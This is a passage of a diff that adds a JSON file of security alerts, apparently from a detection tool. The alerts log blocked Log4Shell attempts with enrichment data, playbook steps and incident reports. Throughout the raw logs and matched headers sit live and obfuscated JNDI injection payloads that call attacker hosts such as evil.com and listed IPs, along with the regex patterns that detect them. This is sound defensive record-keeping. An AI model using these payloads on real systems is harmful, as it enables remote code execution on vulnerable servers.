+        "response_time_ms": 3113,
+        "detected_at": "2026-03-08T01:57:34.676Z",
+        "contained_at": "2026-03-08T01:57:37.789Z"
+      },
+      "ip_blocked": "185.220.101.34",
+      "unblock_scheduled_in": "5 minutes",
+      "response_time_ms": 3113,
+      "notes": "CVE-2021-44228 attempt blocked and contained. Full incident report generated."
+    },
+    "analyst_feedback": null,
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10,
+    "jndi_url": "rmi://45.142.212.100:1099/exploit",
+    "matched_headers": [
+      {
+        "header": "x-client-ip",
+        "value": "${jndi:rmi://45.142.212.100:1099/exploit}",
+        "pattern": "/\\$\\{jndi:/i"
+      }
+    ],
+    "match_count": 1
+  },
+  {
+    "id": "e728a292-b9fb-4cb0-9496-3041de89a9ab",
+    "timestamp": "2026-03-08T01:57:34.954Z",
+    "source_ip": "89.248.167.131",
+    "enriched_ip": "89.248.167.131",
+    "alert_type": "log4shell_attempt",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "89.248.167.131",
+      "alert_type": "log4shell_attempt",
+      "request_rate": 0,
+      "anomaly_detected": true,
+      "cve_id": "CVE-2021-44228",
+      "cvss_score": 10,
+      "jndi_url": "dns://185.220.101.34/pwned",
+      "matched_headers": [
+        {
+          "header": "true-client-ip",
+          "value": "${jndi:dns://185.220.101.34/pwned}",
+          "pattern": "/\\$\\{jndi:/i"
+        }
+      ],
+      "match_count": 1,
+      "attempt_count": 1,
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T01:57:33.596Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:33.596Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 198.235.24.130 jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:33.605Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: user-agent | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:33.611Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: referer | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.123Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: accept-language | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.123Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 45.142.212.100 jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.131Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-forwarded-for-original | payload: ${${upper:j}ndi:ldap://attacker.com/exploit} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.138Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 185.220.101.34 | header: x-client-ip | payload: ${jndi:rmi://45.142.212.100:1099/exploit} | jndi_url: rmi://45.142.212.100:1099/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.138Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 185.220.101.34 jndi_url: rmi://45.142.212.100:1099/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.650Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: true-client-ip | payload: ${jndi:dns://185.220.101.34/pwned} | jndi_url: dns://185.220.101.34/pwned"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "89.248.167.131",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Recyber Scanning",
+        "tags": [
+          "scanner",
+          "web-crawler"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 9841,
+        "countryCode": "NL"
+      },
+      "geoip": {
+        "country": "unknown",
+        "city": "unknown",
+        "isp": "unknown"
+      },
+      "virustotal": {
+        "malicious": 6,
+        "suspicious": 1,
+        "harmless": 66
+      }
+    },
+    "risk_score": 95,
+    "risk_reasoning": "Log4Shell exploitation attempt detected (CVE-2021-44228, CVSS 10.0). Malicious JNDI payload found in HTTP headers: true-client-ip. JNDI callback URL: dns://185.220.101.34/pwned. GreyNoise: malicious [scanner, web-crawler]. AbuseIPDB: 100/100.",
+    "selected_playbook": "log4shell-patch-isolate",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "log4shell-patch-isolate",
+      "steps_executed": [
+        "block_attacker_ip",
+        "tighten_rate_limit",
+        "flag_jndi_endpoint",
+        "simulate_patch_application",
+        "restore_rate_limit",
+        "schedule_ip_unblock_5min"
+      ],
+      "success": true,
+      "incident_report": {
+        "title": "Log4Shell Exploitation Attempt Detected & Blocked",
+        "cve_id": "CVE-2021-44228",
+        "cvss_score": 10,
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "severity": "CRITICAL",
+        "attacker_ip": "89.248.167.131",
+        "enriched_ip": "89.248.167.131",
+        "attacker_location": "unknown, unknown",
+        "attacker_isp": "unknown",
+        "greynoise_classification": "malicious",
+        "greynoise_tags": [
+          "scanner",
+          "web-crawler"
+        ],
+        "abuseipdb_score": 100,
+        "abuseipdb_reports": 9841,
+        "jndi_payload": "dns://185.220.101.34/pwned",
+        "matched_headers": [
+          {
+            "header": "true-client-ip",
+            "value": "${jndi:dns://185.220.101.34/pwned}",
+            "pattern": "/\\$\\{jndi:/i"
+          }
+        ],
+        "affected_component": "HTTP Header Parser (WAF Layer)",
+        "attack_description": "Attacker injected JNDI lookup string into HTTP headers attempting to trigger remote class loading via Log4j CVE-2021-44228. Request was intercepted by DART WAF layer before reaching application.",
+        "remediation_applied": [
+          "Attacker IP blocked at WAF layer",
+          "Rate limit tightened during isolation window",
+          "Affected endpoint flagged for security review",
+          "Patch simulation applied (Log4j 2.15.0+ equivalent)",
+          "IP unblock scheduled for 5 minutes"
+        ],
+        "patch_recommendation": "Upgrade Apache Log4j to version 2.17.1 or later. Set log4j2.formatMsgNoLookups=true as interim mitigation. Review all Java dependencies for transitive Log4j usage.",
+        "response_time_ms": 3027,
+        "detected_at": "2026-03-08T01:57:34.954Z",
+        "contained_at": "2026-03-08T01:57:37.981Z"
+      },
+      "ip_blocked": "89.248.167.131",
+      "unblock_scheduled_in": "5 minutes",
+      "response_time_ms": 3027,
+      "notes": "CVE-2021-44228 attempt blocked and contained. Full incident report generated."
+    },
+    "analyst_feedback": null,
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10,
+    "jndi_url": "dns://185.220.101.34/pwned",
+    "matched_headers": [
+      {
+        "header": "true-client-ip",
+        "value": "${jndi:dns://185.220.101.34/pwned}",
+        "pattern": "/\\$\\{jndi:/i"
+      }
+    ],
+    "match_count": 1
+  },
+  {
+    "id": "14fa7054-6873-4d14-9342-c94012d12ac1",
+    "timestamp": "2026-03-08T01:57:36.510Z",
+    "source_ip": "80.82.77.139",
+    "enriched_ip": "80.82.77.139",
+    "alert_type": "log4shell_attempt",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "80.82.77.139",
+      "alert_type": "log4shell_attempt",
+      "request_rate": 1,
+      "anomaly_detected": true,
+      "cve_id": "CVE-2021-44228",
+      "cvss_score": 10,
+      "jndi_url": "ldap://185.220.101.34/a",
+      "matched_headers": [
+        {
+          "header": "accept-language",
+          "value": "${jndi:ldap://185.220.101.34/a}",
+          "pattern": "/\\$\\{jndi:/i"
+        }
+      ],
+      "match_count": 1,
+      "attempt_count": 1,
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T01:57:34.650Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 89.248.167.131 jndi_url: dns://185.220.101.34/pwned"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.658Z",
+          "level": "INFO",
+          "message": "Request from 185.220.101.34 — GET /api/data"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.671Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-api-version | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.687Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 45.142.212.100"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.693Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 198.235.24.130"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.697Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 185.220.101.34"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.708Z",
+          "level": "WARN",
+          "message": "Rate limit changed: 100 → 20 req/min"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.711Z",
+          "level": "WARN",
+          "message": "Rate limit changed: 20 → 20 req/min"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.724Z",
+          "level": "WARN",
+          "message": "Rate limit changed: 20 → 20 req/min"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.956Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 89.248.167.131"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:34.960Z",
+          "level": "WARN",
+          "message": "Rate limit changed: 20 → 20 req/min"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:35.181Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: referer | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:35.183Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: accept-language | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:35.184Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: x-forwarded-for-original | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:35.710Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: x-client-ip | payload: ${${upper:j}ndi:ldap://attacker.com/exploit} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:35.716Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: true-client-ip | payload: ${jndi:rmi://45.142.212.100:1099/exploit} | jndi_url: rmi://45.142.212.100:1099/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:35.719Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: user-agent | payload: ${jndi:dns://185.220.101.34/pwned} | jndi_url: dns://185.220.101.34/pwned"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:36.230Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 198.235.24.130"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:36.234Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: referer | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:57:36.238Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: accept-language | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "80.82.77.139",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Censys Scanner",
+        "tags": [
+          "scanner",
+          "shodan"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 7632,
+        "countryCode": "NL"
+      },
+      "geoip": {
+        "country": "unknown",
+        "city": "unknown",
+        "isp": "unknown"
+      },
+      "virustotal": {
+        "malicious": 9,
+        "suspicious": 2,
+        "harmless": 61
+      }
+    },
+    "risk_score": 95,
+    "risk_reasoning": "Log4Shell exploitation attempt detected (CVE-2021-44228, CVSS 10.0). Malicious JNDI payload found in HTTP headers: accept-language. JNDI callback URL: ldap://185.220.101.34/a. GreyNoise: malicious [scanner, shodan]. AbuseIPDB: 100/100.",
+    "selected_playbook": "log4shell-patch-isolate",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "log4shell-patch-isolate",
+      "steps_executed": [
+        "block_attacker_ip",
+        "tighten_rate_limit",
+        "flag_jndi_endpoint",
+        "simulate_patch_application",
+        "restore_rate_limit",
+        "schedule_ip_unblock_5min"
+      ],
+      "success": true,
+      "incident_report": {
+        "title": "Log4Shell Exploitation Attempt Detected & Blocked",
+        "cve_id": "CVE-2021-44228",
+        "cvss_score": 10,
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "severity": "CRITICAL",
+        "attacker_ip": "80.82.77.139",
+        "enriched_ip": "80.82.77.139",
+        "attacker_location": "unknown, unknown",
+        "attacker_isp": "unknown",
+        "greynoise_classification": "malicious",
+        "greynoise_tags": [
+          "scanner",
+          "shodan"
+        ],
+        "abuseipdb_score": 100,
+        "abuseipdb_reports": 7632,
+        "jndi_payload": "ldap://185.220.101.34/a",
+        "matched_headers": [
+          {
+            "header": "accept-language",
+            "value": "${jndi:ldap://185.220.101.34/a}",
+            "pattern": "/\\$\\{jndi:/i"
+          }
+        ],
+        "affected_component": "HTTP Header Parser (WAF Layer)",
+        "attack_description": "Attacker injected JNDI lookup string into HTTP headers attempting to trigger remote class loading via Log4j CVE-2021-44228. Request was intercepted by DART WAF layer before reaching application.",
+        "remediation_applied": [
+          "Attacker IP blocked at WAF layer",
+          "Rate limit tightened during isolation window",
+          "Affected endpoint flagged for security review",
+          "Patch simulation applied (Log4j 2.15.0+ equivalent)",
+          "IP unblock scheduled for 5 minutes"
+        ],
+        "patch_recommendation": "Upgrade Apache Log4j to version 2.17.1 or later. Set log4j2.formatMsgNoLookups=true as interim mitigation. Review all Java dependencies for transitive Log4j usage.",
+        "response_time_ms": 3054,
+        "detected_at": "2026-03-08T01:57:36.510Z",
+        "contained_at": "2026-03-08T01:57:39.564Z"
+      },
+      "ip_blocked": "80.82.77.139",
+      "unblock_scheduled_in": "5 minutes",
+      "response_time_ms": 3054,
+      "notes": "CVE-2021-44228 attempt blocked and contained. Full incident report generated."
+    },
+    "analyst_feedback": null,
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10,
+    "jndi_url": "ldap://185.220.101.34/a",
+    "matched_headers": [
+      {
+        "header": "accept-language",
+        "value": "${jndi:ldap://185.220.101.34/a}",
+        "pattern": "/\\$\\{jndi:/i"
+      }
+    ],
+    "match_count": 1
+  },
+  {
+    "id": "08b21bd2-b1d1-4eb2-a7cf-9f105a2d9481",
+    "timestamp": "2026-03-08T02:01:47.658Z",
+    "source_ip": "80.82.77.139",
+    "enriched_ip": "80.82.77.139",
+    "alert_type": "log4shell_attempt",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "80.82.77.139",
+      "alert_type": "log4shell_attempt",
+      "request_rate": 0,
+      "anomaly_detected": true,
+      "cve_id": "CVE-2021-44228",
+      "cvss_score": 10,
+      "jndi_url": null,
+      "matched_headers": [
+        {
+          "header": "referer",
+          "value": "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x}",
+          "pattern": "/\\$\\{(\\$\\{\\::-j\\}|\\$\\{upper:j\\})/i"
+        }
+      ],
+      "match_count": 1,
+      "attempt_count": 1,
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T01:58:30.479Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: true-client-ip | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:30.483Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 185.220.101.34 | header: user-agent | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:30.989Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 185.220.101.34 | header: accept-language | payload: ${${upper:j}ndi:ldap://attacker.com/exploit} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:30.994Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: referer | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:30.998Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: x-api-version | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:31.509Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: x-forwarded-for-original | payload: ${jndi:rmi://45.142.212.100:1099/exploit} | jndi_url: rmi://45.142.212.100:1099/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:31.514Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 89.248.167.131"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:31.517Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: x-client-ip | payload: ${jndi:dns://185.220.101.34/pwned} | jndi_url: dns://185.220.101.34/pwned"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.023Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: user-agent | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.029Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.033Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 185.220.101.34 | header: referer | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.541Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: accept-language | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.545Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: x-forwarded-for-original | payload: ${${upper:j}ndi:ldap://attacker.com/exploit} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.547Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: x-client-ip | payload: ${jndi:rmi://45.142.212.100:1099/exploit} | jndi_url: rmi://45.142.212.100:1099/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:33.054Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: true-client-ip | payload: ${jndi:dns://185.220.101.34/pwned} | jndi_url: dns://185.220.101.34/pwned"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:33.058Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-api-version | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:33.062Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.330Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.330Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 45.142.212.100 jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.342Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: referer | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "80.82.77.139",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Censys Scanner",
+        "tags": [
+          "scanner",
+          "shodan"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 7632,
+        "countryCode": "NL"
+      },
+      "geoip": {
+        "country": "unknown",
+        "city": "unknown",
+        "isp": "unknown"
+      },
+      "virustotal": {
+        "malicious": 9,
+        "suspicious": 2,
+        "harmless": 61
+      }
+    },
+    "risk_score": 95,
+    "risk_reasoning": "Log4Shell exploitation attempt detected (CVE-2021-44228, CVSS 10.0). Malicious JNDI payload found in HTTP headers: referer. JNDI callback URL: unknown. GreyNoise: malicious [scanner, shodan]. AbuseIPDB: 100/100.",
+    "selected_playbook": "log4shell-patch-isolate",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "log4shell-patch-isolate",
+      "steps_executed": [
+        "block_attacker_ip",
+        "tighten_rate_limit",
+        "flag_jndi_endpoint",
+        "simulate_patch_application",
+        "restore_rate_limit",
+        "schedule_ip_unblock_5min"
+      ],
+      "success": true,
+      "incident_report": {
+        "title": "Log4Shell Exploitation Attempt Detected & Blocked",
+        "cve_id": "CVE-2021-44228",
+        "cvss_score": 10,
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "severity": "CRITICAL",
+        "attacker_ip": "80.82.77.139",
+        "enriched_ip": "80.82.77.139",
+        "attacker_location": "unknown, unknown",
+        "attacker_isp": "unknown",
+        "greynoise_classification": "malicious",
+        "greynoise_tags": [
+          "scanner",
+          "shodan"
+        ],
+        "abuseipdb_score": 100,
+        "abuseipdb_reports": 7632,
+        "jndi_payload": "unknown",
+        "matched_headers": [
+          {
+            "header": "referer",
+            "value": "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x}",
+            "pattern": "/\\$\\{(\\$\\{\\::-j\\}|\\$\\{upper:j\\})/i"
+          }
+        ],
+        "affected_component": "HTTP Header Parser (WAF Layer)",
+        "attack_description": "Attacker injected JNDI lookup string into HTTP headers attempting to trigger remote class loading via Log4j CVE-2021-44228. Request was intercepted by DART WAF layer before reaching application.",
+        "remediation_applied": [
+          "Attacker IP blocked at WAF layer",
+          "Rate limit tightened during isolation window",
+          "Affected endpoint flagged for security review",
+          "Patch simulation applied (Log4j 2.15.0+ equivalent)",
+          "IP unblock scheduled for 5 minutes"
+        ],
+        "patch_recommendation": "Upgrade Apache Log4j to version 2.17.1 or later. Set log4j2.formatMsgNoLookups=true as interim mitigation. Review all Java dependencies for transitive Log4j usage.",
+        "response_time_ms": 3077,
+        "detected_at": "2026-03-08T02:01:47.658Z",
+        "contained_at": "2026-03-08T02:01:50.735Z"
+      },
+      "ip_blocked": "80.82.77.139",
+      "unblock_scheduled_in": "5 minutes",
+      "response_time_ms": 3077,
+      "notes": "CVE-2021-44228 attempt blocked and contained. Full incident report generated."
+    },
+    "analyst_feedback": null,
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10,
+    "jndi_url": null,
+    "matched_headers": [
+      {
+        "header": "referer",
+        "value": "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x}",
+        "pattern": "/\\$\\{(\\$\\{\\::-j\\}|\\$\\{upper:j\\})/i"
+      }
+    ],
+    "match_count": 1
+  },
+  {
+    "id": "cd19a8eb-8a92-4934-a10f-ccce813c023f",
+    "timestamp": "2026-03-08T02:01:47.661Z",
+    "source_ip": "89.248.167.131",
+    "enriched_ip": "89.248.167.131",
+    "alert_type": "log4shell_attempt",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "89.248.167.131",
+      "alert_type": "log4shell_attempt",
+      "request_rate": 0,
+      "anomaly_detected": true,
+      "cve_id": "CVE-2021-44228",
+      "cvss_score": 10,
+      "jndi_url": "ldap://45.142.212.100:1389/exploit",
+      "matched_headers": [
+        {
+          "header": "user-agent",
+          "value": "${jndi:ldap://45.142.212.100:1389/exploit}",
+          "pattern": "/\\$\\{jndi:/i"
+        }
+      ],
+      "match_count": 1,
+      "attempt_count": 1,
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T01:58:30.989Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 185.220.101.34 | header: accept-language | payload: ${${upper:j}ndi:ldap://attacker.com/exploit} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:30.994Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: referer | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:30.998Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: x-api-version | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:31.509Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: x-forwarded-for-original | payload: ${jndi:rmi://45.142.212.100:1099/exploit} | jndi_url: rmi://45.142.212.100:1099/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:31.514Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 89.248.167.131"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:31.517Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: x-client-ip | payload: ${jndi:dns://185.220.101.34/pwned} | jndi_url: dns://185.220.101.34/pwned"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.023Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: user-agent | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.029Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.033Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 185.220.101.34 | header: referer | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.541Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: accept-language | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.545Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: x-forwarded-for-original | payload: ${${upper:j}ndi:ldap://attacker.com/exploit} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:32.547Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: x-client-ip | payload: ${jndi:rmi://45.142.212.100:1099/exploit} | jndi_url: rmi://45.142.212.100:1099/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:33.054Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: true-client-ip | payload: ${jndi:dns://185.220.101.34/pwned} | jndi_url: dns://185.220.101.34/pwned"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:33.058Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-api-version | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T01:58:33.062Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:01:47.330Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
